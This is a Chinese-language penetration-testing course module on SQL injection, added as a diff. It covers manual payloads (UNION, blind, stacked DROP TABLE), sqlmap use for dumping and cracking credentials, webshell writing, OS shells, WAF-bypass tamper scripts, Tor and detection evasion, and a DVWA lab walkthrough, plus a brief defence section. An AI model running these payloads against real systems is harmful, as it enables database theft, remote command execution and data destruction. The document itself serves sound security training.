@@ -1,0 +1,695 @@
+================================================================================
+模块 04：SQL注入攻击
+================================================================================
+模块标题：数据库之门 — SQL注入原理与sqlmap实战
+学习目标：
+  1. 深入理解SQL注入的产生原理和危害
+  2. 掌握SQL注入的手工测试方法
+  3. 熟练使用sqlmap进行自动化SQL注入利用
+  4. 掌握sqlmap的高级选项 (tamper、OS shell等)
+  5. 了解盲SQL注入的原理和工具 (bsqlbf, blindsql)
+  6. 能在DVWA靶场完成完整的SQL注入渗透链
+工具分类：注入攻击工具
+推荐工具：sqlmap (核心), bsqlbf, blindsql
+优先级：★★★★★ (OWASP Top 10第一位, 最致命的Web漏洞)
+================================================================================
+
+============================================================
+第一部分：SQL注入原理
+============================================================
+
+【1.1 什么是SQL注入】
+
+SQL注入 (SQL Injection) 是指攻击者通过把恶意SQL代码插入到
+应用程序的输入参数中，从而操纵后端数据库执行非预期的SQL命令。
+
+【1.2 漏洞产生原因】
+
+正常代码 (PHP + MySQL):
+  $id = $_GET['id'];
+  $query = "SELECT * FROM users WHERE id = $id";
+  $result = mysql_query($query);
+
+正常输入: id=1
+  执行的SQL: SELECT * FROM users WHERE id = 1
+
+恶意输入: id=1 OR 1=1
+  执行的SQL: SELECT * FROM users WHERE id = 1 OR 1=1
+  结果: 返回所有用户记录！(因为 1=1 永远为真)
+
+更恶意的输入: id=-1 UNION SELECT username,password FROM users
+  执行的SQL: SELECT * FROM users WHERE id = -1 UNION SELECT username,password FROM users
+  结果: 窃取所有用户名和密码！
+
+【1.3 SQL注入类型】
+
+按注入位置分类:
+  1. GET参数注入: ?id=1'  (URL可见)
+  2. POST参数注入: 表单提交的数据
+  3. Cookie注入: Cookie中的值拼接SQL
+  4. Header注入: User-Agent, Referer, X-Forwarded-For
+  5. JSON注入: API中的JSON数据
+  6. SOAP/XML注入: Web Service调用
+
+按技术分类:
+  1. 联合查询注入 (UNION-based): 使用UNION SELECT合并查询结果
+     → 最直接，回显数据在页面上
+     例: ?id=-1 UNION SELECT 1,2,3,4,5 --
+  
+  2. 报错注入 (Error-based): 利用数据库报错信息获取数据
+     → 依靠详细的错误信息 (开发环境常见)
+     例: ?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version))) --
+  
+  3. 布尔盲注 (Boolean-based Blind): 通过页面差异判断真假
+     → 页面没有回显数据但行为不同
+     例: ?id=1' AND 1=1 --  (页面正常)
+         ?id=1' AND 1=2 --  (页面异常)
+  
+  4. 时间盲注 (Time-based Blind): 通过响应延迟判断
+     → 页面完全没有变化时使用
+     例: ?id=1' AND SLEEP(5) --  (延迟5秒则存在注入)
+  
+  5. 堆叠查询 (Stacked Queries): 执行多条SQL
+     → 使用分号分隔多条语句 (不总是支持)
+     例: ?id=1; DROP TABLE users; --
+  
+  6. 二次注入 (Second-Order): 恶意数据先存储后被使用
+     → 注册时用户名: admin' --
+     → 后续某处不安全使用用户名，触发注入
+
+按数据库分类:
+  MySQL/MariaDB    → 使用 information_schema
+  PostgreSQL       → 使用 information_schema, pg_class
+  Microsoft SQL    → 使用 sysobjects, 支持xp_cmdshell
+  Oracle           → 使用 all_tables, 语法差异大
+  SQLite           → 使用 sqlite_master
+  MongoDB          → NoSQL注入 ($ne, $gt等操作符)
+
+============================================================
+第二部分：手工SQL注入测试
+============================================================
+
+在自动化之前，理解手工测试是必要的。
+
+Step 1: 寻找注入点
+  目标特征:
+  - URL中有数字参数: page.php?id=1
+  - URL中有字符串参数: page.php?cat=books
+  - 搜索框、登录框
+  - 任何接受用户输入并查询数据库的地方
+
+Step 2: 基本测试字符
+  依次输入以下测试字符并观察响应变化:
+  
+  '       → 单引号 (测试字符串闭合)
+  "       → 双引号
+  \       → 反斜杠 (可能暴露数据库类型)
+  ;       → 分号 (测试堆叠查询)
+  )       → 右括号 (测试括号闭合)
+  ' --    → 单引号+注释
+  ' #     → 单引号+MySQL注释
+  NULL    → 空值测试
+  
+  异常表现:
+  - 显示数据库错误 (报错注入机会！)
+  - 页面内容变化 (布尔盲注机会！)
+  - 页面空白或500错误 (可能存在漏洞)
+  - 响应时间变长 (时间盲注机会！)
+
+Step 3: 确认注入 (基础测试)
+
+  数字型注入测试:
+  正常: ?id=1       → 页面正常
+  永真: ?id=1 AND 1=1   → 页面正常
+  永假: ?id=1 AND 1=2   → 页面异常
+  判定: 如果永真正常、永假异常，且1=2不含特殊字符，即可确认数字型注入
+
+  字符型注入测试:
+  正常: ?name=admin
+  字符: ?name=admin' --    → 页面正常
+  字符: ?name=admin' AND '1'='1  → 正常
+  字符: ?name=admin' AND '1'='2  → 异常
+  判定: 确认字符型注入
+
+Step 4: 确定列数 (UNION注入)
+  使用ORDER BY:
+   ?id=1 ORDER BY 1 --  → 正常
+   ?id=1 ORDER BY 2 --  → 正常
+   ?id=1 ORDER BY 5 --  → 正常
+   ?id=1 ORDER BY 10 -- → 错误！
+  判定: 列数为9或更少，逐个缩小范围
+
+  使用UNION SELECT:
+   ?id=-1 UNION SELECT 1,2,3,4,5 -- → 正常
+   ?id=-1 UNION SELECT 1,2,3,4,5,6 -- → 错误！
+  判定: 列数为5
+
+Step 5: 确定数据回显位置
+   ?id=-1 UNION SELECT 1,2,3,4,5 --
+   观察页面上显示的数字: 哪些位置的数据直接显示在页面中
+   例: 页面上显示了 "3" 和 "5"
+   → 第3列和第5列是回显点
+
+Step 6: 获取数据库信息
+  ?id=-1 UNION SELECT 1,database(),3,user(),5 --
+  → 回显数据库名和用户名
+
+Step 7: 获取表名
+  MySQL:
+  ?id=-1 UNION SELECT 1,group_concat(table_name),3,4,5 
+       FROM information_schema.tables WHERE table_schema=database() --
+
+Step 8: 获取列名
+  ?id=-1 UNION SELECT 1,group_concat(column_name),3,4,5 
+       FROM information_schema.columns 
+       WHERE table_name='users' --
+
+Step 9: 获取数据 (最终目标!)
+  ?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3,4,5 
+       FROM users --
+
+============================================================
+第三部分：sqlmap — 自动化SQL注入神器
+============================================================
+
+【3.1 sqlmap介绍】
+
+sqlmap是最强大、最流行的SQL注入自动化工具。它支持:
+  - 所有主流数据库 (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.)
+  - 6种注入技术 (B/E/U/S/T/Q)
+  - 完整的数据库枚举
+  - 文件系统访问 (读/写文件)
+  - 操作系统命令执行 (--os-shell)
+  - WAF/IDS绕过 (--tamper)
+  - 多种输出格式
+
+⚠️  sqlmap默认会进行大量测试请求，务必在授权的目标上使用。
+    对生产系统的未授权sqlmap扫描是违法行为。
+
+【3.2 基本扫描命令】
+
+命令格式: sqlmap -u "<URL>"
+
+# 最基础的测试
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
+
+# 输出示例:
+# [*] starting @ 10:00:00
+# [10:00:05] [INFO] testing connection to the target URL
+# [10:00:10] [INFO] testing if the target URL is stable
+# [10:00:15] [INFO] GET parameter 'cat' appears to be dynamic
+# [10:00:20] [WARNING] heuristic test shows that GET parameter 'cat'
+# might be injectable
+# [10:00:30] [INFO] testing for SQL injection on GET parameter 'cat'
+# [10:00:35] [INFO] GET parameter 'cat' is 'Generic UNION query' injectable
+# GET parameter 'cat' is vulnerable. Do you want to keep testing the others?
+
+【3.3 获取数据库信息】
+
+# 获取所有数据库
+sqlmap -u "http://example.com/page.php?id=1" --dbs
+
+示例输出:
+  available databases [5]:
+  [*] information_schema
+  [*] mysql
+  [*] performance_schema
+  [*] testdb          ← 目标数据库
+  [*] wordpress
+
+# 获取当前数据库
+sqlmap -u "http://example.com/page.php?id=1" --current-db
+
+# 获取数据库用户
+sqlmap -u "http://example.com/page.php?id=1" --current-user
+
+# 获取所有数据库用户
+sqlmap -u "http://example.com/page.php?id=1" --users
+
+# 获取当前用户是否为DBA
+sqlmap -u "http://example.com/page.php?id=1" --is-dba
+
+# 获取用户的密码哈希
+sqlmap -u "http://example.com/page.php?id=1" --passwords
+
+【3.4 枚举数据库表】
+
+# 获取指定数据库的表
+sqlmap -u "http://example.com/page.php?id=1" -D testdb --tables
+
+示例输出:
+  Database: testdb
+  [5 tables]
+  +-----------+
+  | users     |
+  | products  |
+  | orders    |
+  | sessions  |
+  | config    |
+  +-----------+
+
+# 获取所有数据库的所有表 (谨慎！耗时长)
+sqlmap -u "http://example.com/page.php?id=1" --tables
+
+【3.5 枚举列】
+
+# 获取指定表的列
+sqlmap -u "http://example.com/page.php?id=1" -D testdb -T users --columns
+
+示例输出:
+  Table: users
+  [6 columns]
+  +----------+-------------+
+  | Column   | Type        |
+  +----------+-------------+
+  | id       | int(11)     |
+  | username | varchar(50) |
+  | password | varchar(255)|
+  | email    | varchar(100)|
+  | role     | varchar(20) |
+  | created  | datetime    |
+  +----------+-------------+
+
+【3.6 获取数据 (dump)】
+
+# 获取指定列的全部数据
+sqlmap -u "http://example.com/page.php?id=1" \
+       -D testdb -T users -C username,password --dump
+
+# 获取整个表的数据
+sqlmap -u "http://example.com/page.php?id=1" \
+       -D testdb -T users --dump
+
+# 限制输出行数
+sqlmap -u "http://example.com/page.php?id=1" \
+       -D testdb -T users --dump --stop 10
+
+# 排除系统数据库
+sqlmap -u "http://example.com/page.php?id=1" \
+       -D testdb -T users --dump --exclude-sysdbs
+
+# 导出到指定目录 (默认: ~/.sqlmap/output/)
+sqlmap -u "http://example.com/page.php?id=1" \
+       -D testdb -T users --dump --dump-dir /home/a/sqlmap_dumps/
+
+【3.7 POST请求注入】
+
+# POST表单注入
+sqlmap -u "http://example.com/login.php" \
+       --data="username=admin&password=123&submit=Login"
+
+# 指定参数测试 (不测试所有参数)
+sqlmap -u "http://example.com/login.php" \
+       --data="username=admin&password=123" -p password
+
+# 从文件读取请求 (Burp抓到的完整请求)
+# 在Burp中右键请求 → Save request to file → request.txt
+sqlmap -r request.txt
+
+# 一键测试request.txt中的所有参数
+sqlmap -r request.txt --batch
+
+【3.8 Cookie注入】
+
+# 使用Cookie (认证)
+sqlmap -u "http://example.com/page.php?id=1" \
+       --cookie="PHPSESSID=abc123; security=low"
+
+# Cookie值本身作为注入点
+sqlmap -u "http://example.com/index.php" \
+       --cookie="id=1" -p id
+
+# 从文件读取cookie
+sqlmap -u "http://example.com/page.php?id=1" \
+       --load-cookies=cookies.txt
+
+============================================================
+第四部分：sqlmap 高级技巧
+============================================================
+
+【4.1 文件系统操作】
+
+# 读取文件 (需要DBA权限)
+sqlmap -u "http://example.com/page.php?id=1" \
+       --file-read="/etc/passwd"
+
+# 写入文件 (写webshell)
+sqlmap -u "http://example.com/page.php?id=1" \
+       --file-write="/home/a/shell.php" \
+       --file-dest="/var/www/html/shell.php"
+
+【4.2 获取操作系统Shell】
+
+# 获取交互式SQL Shell
+sqlmap -u "http://example.com/page.php?id=1" --sql-shell
+
+# 获取操作系统Shell (需要DBA + secure_file_priv允许)
+sqlmap -u "http://example.com/page.php?id=1" --os-shell
+
+# 指定Web根目录
+sqlmap -u "http://example.com/page.php?id=1" --os-shell --web-root="/var/www/html"
+
+# 获取命令执行
+sqlmap -u "http://example.com/page.php?id=1" --os-cmd="whoami"
+sqlmap -u "http://example.com/page.php?id=1" --os-cmd="id"
+sqlmap -u "http://example.com/page.php?id=1" --os-cmd="cat /etc/passwd"
+
+# 获取Meterpreter shell (配合Metasploit)
+sqlmap -u "http://example.com/page.php?id=1" --os-pwn
+
+【4.3 WAF绕过 — Tamper脚本】
+
+# 列出所有tamper脚本
+sqlmap --list-tampers
+
+# 常用tamper脚本解释:
+  space2comment       → 用注释/**/替换空格
+  space2plus          → 用+替换空格
+  space2randomblank   → 随机空白字符替换空格
+  base64encode        → Base64编码参数
+  charencode          → URL编码
+  charunicodeencode   → Unicode编码
+  between             → 用BETWEEN替换比较运算符
+  commixed            → 杂项混合
+  equaltolike         → 用LIKE代替=
+  greatest            → 用GREATEST绕过比较
+  modsecurityversioned → 利用ModSecurity版本差异
+  randomcase          → 随机大小写
+  versionedmorekeywords → 增加版本化注释
+  xforwardedfor       → 添加伪造的X-Forwarded-For
+
+# 单个tamper
+sqlmap -u "http://example.com/page.php?id=1" \
+       --tamper=space2comment
+
+# 多个tamper组合
+sqlmap -u "http://example.com/page.php?id=1" \
+       --tamper="space2comment,charencode,randomcase"
+
+# 针对特定数据库的tamper (提高效率)
+sqlmap -u "http://example.com/page.php?id=1" \
+       --tamper="space2comment,between,randomcase" --dbms=mysql
+
+# 使用tamper+代理 (调试payload)
+sqlmap -u "http://example.com/page.php?id=1" \
+       --tamper=space2comment --proxy="http://127.0.0.1:8080"
+
+【4.4 其他高级选项】
+
+# 指定数据库类型 (跳过探测, 加速)
+sqlmap -u "URL" --dbms=mysql
+
+# 指定注入技术 (用逗号分隔: B/E/U/S/T/Q)
+# B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline
+sqlmap -u "URL" --technique=U
+sqlmap -u "URL" --technique=BEUS
+
+# 设置攻击等级 (1-5, 默认1)
+# 1=最低, 5=最高 (payload组合指数增长, 易被WAF拦截)
+sqlmap -u "URL" --level=3
+
+# 设置风险等级 (1-3, 默认1)
+# 1=安全, 2=中等(可能造成数据损坏), 3=高风险(可能UPDATE/DELETE)
+sqlmap -u "URL" --risk=2
+
+# 自定义prefix/suffix
+sqlmap -u "URL" --prefix="')" --suffix=" AND ('abc'='abc"
+
+# 使用代理
+sqlmap -u "URL" --proxy="http://127.0.0.1:8080"
+
+# 使用Tor匿名化
+sqlmap -u "URL" --tor --tor-type=SOCKS5 --check-tor
+
+# 随机延迟 (伪装, 避免检测)
+sqlmap -u "URL" --delay=2
+sqlmap -u "URL" --delay=0.5 --randomize=0.25
+
+# 批量模式 (所有提示选默认)
+sqlmap -u "URL" --batch
+
+# 刷新session (对新URL, 清除之前的扫描数据)
+sqlmap -u "URL" --flush-session
+
+# 多线程 (加快dump速度, 默认1)
+sqlmap -u "URL" -D db -T table --dump --threads=10
+
+# 忽略特定参数
+sqlmap -u "URL" --skip=csrf_token
+
+# 设置空连接 (适合无法建立稳定连接的情况)
+sqlmap -u "URL" --null-connection
+
+# 指定目标URL为第二注入点 (二阶注入)
+sqlmap -u "URL" --second-url="http://example.com/second.php"
+
+# 设置安全URL (用于检查连接, 不测试)
+sqlmap -u "URL" --safe-url="http://example.com/" --safe-freq=3
+
+============================================================
+第五部分：DVWA SQL注入实战演练
+============================================================
+
+【靶机环境: Damn Vulnerable Web Application (DVWA)】
+
+DVWA是专门为安全学习者设计的故意包含漏洞的Web应用。
+包含SQL注入、XSS、CSRF、文件包含、命令注入等多种漏洞。
+
+【预设条件】
+  - DVWA已安装: http://dvwa.local (或 http://localhost/dvwa)
+  - 默认凭证: admin / password
+  - MySQL数据库已初始化
+
+【完整实战流程】
+
+Step 1: Firefox访问DVWA并登录
+  1. 打开Firefox浏览器
+  2. 地址栏输入: http://dvwa.local/login.php
+  3. 在Username输入: admin
+  4. 在Password输入: password
+  5. 点击 Login 按钮
+  6. 确认登录成功 (看到DVWA主页面)
+
+Step 2: 降低安全级别 (便于学习)
+  1. 左侧菜单点击: DVWA Security
+  2. Security Level 选择: Low
+  3. 点击 Submit
+  4. 确认提示: "Security level set to low"
+
+Step 3: 手动测试SQL注入
+  1. 左侧菜单点击: SQL Injection
+  2. 看到输入框: User ID
+  3. 在输入框输入: 1
+  4. 点击 Submit
+  5. 观察结果:
+     ID: 1
+     First name: admin
+     Surname: admin
+  6. 输入: 2
+  7. 点Submit, 观察结果:
+     ID: 2
+     First name: Gordon
+     Surname: Brown
+  8. 输入: 1' (单引号测试)
+  9. 点Submit, 观察错误信息:
+     可能显示: You have an error in your SQL syntax...
+     → 确认字符型SQL注入！
+
+Step 4: 获取Firefox的Cookie
+  1. 按F12打开开发者工具
+  2. 点击 Storage 标签
+  3. 展开 Cookies → http://dvwa.local
+  4. 找到 PHPSESSID  (例: abc123def456)
+  5. 找到 security Cookie (值: low)
+  6. 记录完整的Cookie字符串:
+     PHPSESSID=abc123def456; security=low
+
+Step 5: 使用sqlmap对DVWA进行SQL注入
+  打开新终端窗口。
+
+  5a) 基本测试 (确定注入点):
+  sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
+         --cookie="PHPSESSID=abc123def456; security=low"
+
+  如果sqlmap提示重定向到登录页，说明cookie过期，重新获取cookie。
+
+  5b) 获取数据库:
+  sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
+         --cookie="PHPSESSID=abc123def456; security=low" --dbs
+
+  预期结果:
+  [*] dvwa
+  [*] information_schema
+  [*] mysql
+  [*] performance_schema
+
+  5c) 获取dvwa数据库的表:
+  sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
+         --cookie="PHPSESSID=abc123def456; security=low" -D dvwa --tables
+
+  预期结果:
+  Database: dvwa
+  [2 tables]
+  +-----------+
+  | guestbook |
+  | users     |
+  +-----------+
+
+  5d) 获取users表的列:
+  sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
+         --cookie="PHPSESSID=abc123def456; security=low" \
+         -D dvwa -T users --columns
+
+  预期结果:
+  Table: users
+  [8 columns]
+  +--------------+-------------+
+  | Column       | Type        |
+  +--------------+-------------+
+  | user_id      | int(6)      |
+  | user         | varchar(15) |
+  | avatar       | varchar(70) |
+  | password     | varchar(32) |  ← 注意: 32位，可能是MD5
+  | last_name    | varchar(15) |
+  | first_name   | varchar(15) |
+  | last_login   | timestamp   |
+  | failed_login | int(3)      |
+  +--------------+-------------+
+
+  5e) 获取所有用户数据 (关键步骤！):
+  sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
+         --cookie="PHPSESSID=abc123def456; security=low" \
+         -D dvwa -T users -C user,password --dump
+
+  预期结果:
+  +---------+----------------------------------+
+  | user    | password                         |
+  +---------+----------------------------------+
+  | admin   | 5f4dcc3b5aa765d61d8327deb882cf99|
+  | gordonb | e99a18c428cb38d5f260853678922e03|
+  | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b|
+  | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7|
+  | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99|
+  +---------+----------------------------------+
+
+  sqlmap会询问是否破解密码哈希:
+  Do you want to store hashes to a temporary file for eventual 
+  further processing with other tools [y/N] 输入: y
+  Do you want to crack them via a dictionary-based attack? [Y/n] 输入: y
+
+  sqlmap自带字典可破解简单密码:
+  admin的密码: password (MD5: 5f4dcc3b5aa765d61d8327deb882cf99)
+  1337的密码: charley
+
+Step 6: 安全级别升级测试 (Medium)
+  1. DVWA Security → 设置为 Medium → Submit
+  2. 再次访问 SQL Injection 页面
+  3. 观察: Medium级别使用POST方法 + 下拉菜单
+  4. 使用sqlmap测试POST注入:
+  sqlmap -u "http://dvwa.local/vulnerabilities/sqli/" \
+         --data="id=1&Submit=Submit" \
+         --cookie="PHPSESSID=abc123def456; security=medium"
+
+Step 7: 尝试文件读取 (需要权限)
+  sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
+         --cookie="PHPSESSID=abc123def456; security=low" --file-read="/etc/passwd"
+
+  (根据数据库配置，文件读取可能成功也可能失败)
+
+Step 8: 尝试OS命令执行
+  sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
+         --cookie="PHPSESSID=abc123def456; security=low" \
+         --os-cmd="whoami"
+
+  (需要MySQL的FILE权限和secure_file_priv设置)
+
+============================================================
+第六部分：盲SQL注入工具
+============================================================
+
+【6.1 bsqlbf — 盲SQL注入工具】
+
+# 基本使用
+bsqlbf -u "http://example.com/page.php?id=1" --blind
+
+# 指定参数
+bsqlbf -u "http://example.com/page.php?id=1" -p id --blind
+
+# 指定数据库
+bsqlbf -u "http://example.com/page.php?id=1" --mysql
+
+【6.2 blindsql 脚本】
+
+blindsql是用于自动化盲注的Perl脚本集。
+
+# 基本使用
+cd /usr/share/blindsql/
+perl blindsql.pl -u "http://example.com/page.php?id=1" -p id
+
+============================================================
+第七部分：SQL注入防御与修复
+============================================================
+
+【安全开发建议】(作为红队也需要了解蓝队知识)
+
+  1. 使用参数化查询/预编译语句:
+     $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
+     $stmt->execute([$id]);
+
+  2. 输入验证: 白名单验证优于黑名单
+  3. 最小权限原则: 应用数据库用户不应有DBA权限
+  4. 禁用detailed错误信息: display_errors=Off
+  5. WAF: 部署Web应用防火墙作为额外防护层
+  6. 定期安全测试: 使用sqlmap自测
+
+============================================================
+第八部分：注意事项与实战技巧
+============================================================
+
+【sqlmap使用技巧】
+
+  1. --batch 用于无人值守扫描
+  2. --flush-session 用于新目标扫描
+  3. --random-agent 随机构造User-Agent
+  4. 遇到WAF优先使用 --tamper
+  5. 慢速扫描: --delay=2 --time-sec=10 (绕过WAF)
+  6. --sql-shell 进入交互式SQL查询模式
+  7. --search 搜索特定列名: sqlmap -u "URL" --search -C pass
+  8. 结合Burp: 先手工确认注入点，再用sqlmap自动化
+  9. POST方式: 使用 --data 或 -r request.txt
+ 10. 多目标: sqlmap -m targets.txt --batch
+
+【常见注入点位置】
+
+  URL参数:     page.php?id=1
+  POST数据:    登录表单、搜索框、留言板
+  Cookie:      cookie: uid=1
+  User-Agent:  部分应用记录UA并查询
+  Referer:     来源追踪功能
+  X-Forwarded-For: IP记录功能
+  JSON:        {"id": 1}
+  Multipart:   文件上传的表单字段
+
+⚠️  法律与安全警告：
+  1. 仅在有书面授权的系统上使用sqlmap
+  2. sqlmap流量极易被IDS/IPS检测
+  3. --os-shell, --os-pwn 等高危操作仅在授权环境下使用
+  4. 测试完记得恢复/清除测试数据
+  5. 在生产环境使用 --risk=3 可能破坏数据
+  6. 使用Tor/proxy隐藏真实IP (需要时)
+
+================================================================================
+模块小结
+================================================================================
+
+完成本模块后你应该能够：
+  ✓ 理解SQL注入的原理和分类
+  ✓ 手工测试和确认SQL注入漏洞
+  ✓ 使用sqlmap进行自动化SQL注入攻击
+  ✓ 枚举数据库、表、列和数据
+  ✓ 使用tamper脚本绕过WAF
+  ✓ 获取文件系统访问和OS Shell
+  ✓ 在DVWA靶场完成完整的SQL注入渗透链
+  ✓ 了解SQL注入的防御方法
+
+下一模块预告：05-XSS与CSRF攻击 — 使用beef, xsser, xsstrike等工具
